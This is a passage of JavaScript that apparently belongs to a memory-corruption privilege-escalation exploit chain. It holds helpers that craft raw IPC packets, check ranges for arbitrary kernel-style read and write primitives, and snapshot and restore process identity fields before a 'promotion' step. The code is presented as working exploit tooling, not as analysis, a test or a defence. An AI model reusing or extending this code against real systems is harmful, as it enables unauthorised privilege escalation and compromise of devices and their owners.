                        addressCopy.workerStateSafe !== false) {
                        try {
                            await installPlan(addressPlan,
                                              "cache-retained-failure-restore");
                        } catch {
                        }
                    }

                    addressCopy = {...addressCopy,
                        workerStateSafe: false,
                        retainedEndpointUnsafe: true};
                } else {
                    for (let oi = 0; oi < fields.length; oi++) {
                        try {
                            const originalRead = await readObject(fields[oi],
                                                                  "no-write failure inspection", addressPlan);
                            const unchanged = AnalysisBytes.equal(originalRead,
                                                                  fields[oi].beforeBytes);

                            if (!unchanged) {
                                restoreOk = false;
                            }

                            if (!unchanged) {
                                restoreFailureDetails.push(fields[oi].name + ": original-object-changed-before-promotion");
                            }
                        } catch (originalError) {
                            restoreOk = false;
                            restoreFailureDetails.push(fields[oi].name + ": original-object-inspection-failed: " +
                                originalError.message);
                        }
                    }
                }
            }

            outcome.restored = restoreOk;
            outcome.restoreFailureDetails = restoreFailureDetails;
            outcome.retainedEndpointActive = retainedEndpointReady;
        }
    }

    outcome.addressCopy = addressCopy;

    if (retainedEndpointReady && (outcome.restored ||
            (outcome.promoted && !outcome.promotionRetained))) {
        outcome.retireRetainedEndpoint = retireRetainedEndpoint;
    }

    function isInvalidRetainedCacheArraySnapshot(before, arrayPlan) {
        return AnalysisBytes.readU64LE(before, 0) !==
                AnalysisBytes.readU64LE(arrayPlan.bytes, 0) ||
            AnalysisBytes.readU64LE(before, 8) !==
                AnalysisBytes.readU64LE(arrayPlan.bytes, 8) ||
            before[0x10] !== 0 ||
            AnalysisBytes.readU64LE(before, 0x18) !== 0n ||
            AnalysisBytes.readU64LE(before, 0x20) !== 0n ||
            AnalysisBytes.readU64LE(before, 0x28) !== 0n ||
            !isSafeCacheTail(before, 0x30);
    }

    return outcome;
}

function closeDomainObject(sessionHandle, objectId) {
    if (!sessionHandle || !objectId) {
        return 0xFFFFFFFF;
    }

    const packet = allocPage(0x2000);
    prepPacket(packet, 4, 8, []);
    write8(packet + 0x10n, 2n);
    write32(packet + 0x14n, BigInt(objectId));
    write32(packet + 0x1Cn, 0n);
    return Number(sendIPC(sessionHandle, packet)) >>> 0;
}

function hasPromotionPrerequisites(addressReadVerified, rootStageVerified,
                                   verifiedIdentityTargets, domainSession, candidateHandle, addressPlan) {
    return addressReadVerified && rootStageVerified &&
        verifiedIdentityTargets && domainSession && candidateHandle &&
        addressPlan;
}

function isInvalidLogicalRead(offset, length, addressPlan) {
    return !Number.isSafeInteger(offset) || offset < 0 || length <= 0 ||
        length > 0x4000 || offset + length > addressPlan.storageSize;
}

function isInvalidLogicalWrite(offset, bytes, addressPlan) {
    return !Number.isSafeInteger(offset) || offset < 0 || !bytes ||
        bytes.length <= 0 || bytes.length > 0x4000 ||
        offset + bytes.length > addressPlan.storageSize;
}

function isInvalidBootstrapWrite(writePlan, activePlan, offset, within,
                                 bytes, address, controlSize) {
    return writePlan !== activePlan || offset < 0n ||
        within + BigInt(bytes.length) > BigInt(controlSize) ||
        offset + BigInt(bytes.length) > BigInt(writePlan.storageSize) ||
        address < writePlan.lowerWindow.proposedStart ||
        address + bytes.length > writePlan.target + controlSize;
}

function isInvalidRetainedPointerTarget(state, address) {
    return !state || !state.canonical || !Number.isSafeInteger(address) ||
        address < 0x100000000 || address >= 0x8000000000;
}

function hasChangedRetainedDataDescriptor(entry, state) {
    return AnalysisBytes.readU64LE(entry, 0) !== BigInt(state.dataOffset) ||
        AnalysisBytes.readU64LE(entry, 8) !== 0x4000n ||
        entry[0x10] !== 1 || entry[0x11] !== 1 || entry[0x12] !== 1 ||
        AnalysisBytes.readU64LE(entry, 0x20) !== BigInt(state.pointer);
}

function isInvalidRetainedReadRange(state, address, length) {
    return !state || !state.canonical || !Number.isSafeInteger(address) ||
        address < 0x100000000 || address + length >= 0x8000000000 ||
        !Number.isInteger(length) || length <= 0 || length > 0x600000;
}

function isInvalidRetainedWriteRange(state, address, bytes) {
    return !state || !state.canonical || !Number.isSafeInteger(address) ||
        !bytes || bytes.length <= 0 || bytes.length > 0x600000 ||
        address < 0x100000000 || address + bytes.length >= 0x8000000000;
}

function isInvalidUnverifiedRetainedWriteRange(state, address, bytes) {
    return !state || !state.canonical || !Number.isSafeInteger(address) ||
        !bytes || bytes.length <= 0 || bytes.length > 0x100 ||
        address < 0x100000000 || address + bytes.length >= 0x8000000000;
}

function hasInvalidWriteSnapshots(address, expectedBefore, expectedAfter) {
    return !Number.isSafeInteger(address) || !Array.isArray(expectedBefore) ||
        !Array.isArray(expectedAfter) || expectedBefore.length === 0 ||
        expectedBefore.length !== expectedAfter.length ||
        expectedBefore.length > 0x100;
}

function isInvalidRetainedEndpointLayout(layout) {
    return !layout || !Number.isSafeInteger(layout.array) ||
        !Number.isSafeInteger(layout.owner) ||
        !Number.isSafeInteger(layout.captureStart) ||
        !Number.isSafeInteger(layout.captureEnd) ||
        !Array.isArray(layout.ownerBytes) || layout.ownerBytes.length !== 0x78;
}

function isInvalidRetainedEndpointStructure(layout, addressPlan, array, owner) {
    return array < 0x100000000 || array >= 0x8000000000 || array % 8 !== 0 ||
        owner < 0x100000000 || owner >= 0x8000000000 || owner % 8 !== 0 ||
        array < layout.captureStart || array + 0x5A0 > layout.captureEnd ||
        owner < layout.captureStart || owner + 0x78 > layout.captureEnd ||
        AnalysisBytes.readU64LE(layout.ownerBytes, 0x20) !==
            BigInt(addressPlan.storageSize) ||
        AnalysisBytes.readU64LE(layout.ownerBytes, 0x28) !== 0x4000n ||
        AnalysisBytes.readU64LE(layout.ownerBytes, 0x48) !== BigInt(array) ||
        AnalysisBytes.readU64LE(layout.ownerBytes, 0x50) !== 0x5A0n ||
        AnalysisBytes.readU32LE(layout.ownerBytes, 0x58) !== 10 ||
        AnalysisBytes.readU64LE(layout.ownerBytes, 0x60) !== 14n;
}

function isInvalidRetainedOwnerSnapshot(bytes, addressPlan, array, activeCount) {
    return AnalysisBytes.readU64LE(bytes, 0x20) !==
            BigInt(addressPlan.storageSize) ||
        AnalysisBytes.readU64LE(bytes, 0x28) !== 0x4000n ||
        AnalysisBytes.readU64LE(bytes, 0x48) !== BigInt(array) ||
        AnalysisBytes.readU64LE(bytes, 0x50) !== 0x5A0n ||
        AnalysisBytes.readU32LE(bytes, 0x58) !== activeCount ||
        AnalysisBytes.readU64LE(bytes, 0x60) !== 14n;
}

function isInvalidRetainedOwnerRetirementSnapshot(owner, addressPlan, state) {
    return AnalysisBytes.readU64LE(owner, 0x20) !==
            BigInt(addressPlan.storageSize) ||
        AnalysisBytes.readU64LE(owner, 0x28) !== 0x4000n ||
        AnalysisBytes.readU64LE(owner, 0x48) !== BigInt(state.array) ||
        AnalysisBytes.readU64LE(owner, 0x50) !== 0x5A0n ||
        AnalysisBytes.readU32LE(owner, 0x58) !== 0 ||
        AnalysisBytes.readU64LE(owner, 0x60) !== 14n;
}

function isInvalidRetainedEndpointState(retainedEndpointReady, state, outcome) {
    return !retainedEndpointReady || !state || !state.canonical ||
        state.retired || (!outcome.restored && !outcome.promoted);
}

function isInvalidPromotionProbePrerequisites(domainSession, verifiedIdentityTargets, candidateHandle, addressPlan) {
    return !domainSession || domainSession.rootObj !==
        verifiedIdentityTargets.domainId || !candidateHandle || !addressPlan ||
        !addressPlan.lowerWindow;
}

function hasInvalidIdentityFieldSnapshot(field) {
    return !field.beforeBytes ||
        field.beforeBytes.length !== field.objectSize ||
        !RootLayout.isCanonicalPointer(BigInt(field.object)) ||
        field.pidOffset < 0 || field.pidOffset + 8 > field.objectSize ||
        AnalysisBytes.readU64LE(field.beforeBytes,
                                field.pidOffset) !== field.before;
}
